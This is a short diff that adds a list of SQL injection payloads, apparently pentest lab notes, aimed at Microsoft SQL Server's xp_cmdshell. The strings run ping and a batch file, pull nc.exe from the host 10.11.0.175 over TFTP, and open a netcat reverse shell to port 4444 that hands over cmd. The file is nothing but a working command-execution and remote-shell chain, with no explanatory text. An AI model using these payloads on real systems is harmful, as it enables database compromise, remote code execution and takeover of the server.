@@ -1,0 +1,13 @@
+'; exec master..xp_cmdshell 'ping 10.11.0.175'--
+
+
+'; exec master..xp_cmdshell 'echo ping 10.11.0.175 >> ping.bat'--
+
+'; exec master..xp_cmdshell 'ping.bat'--
+
+tftp -i 10.11.0.175 get nc.exe
+
+'; exec master..xp_cmdshell 'tftp -i 10.11.0.175 get nc.exe'--
+
+
+'; exec master..xp_cmdshell 'nc -nv 10.11.0.175 4444 -e cmd"--
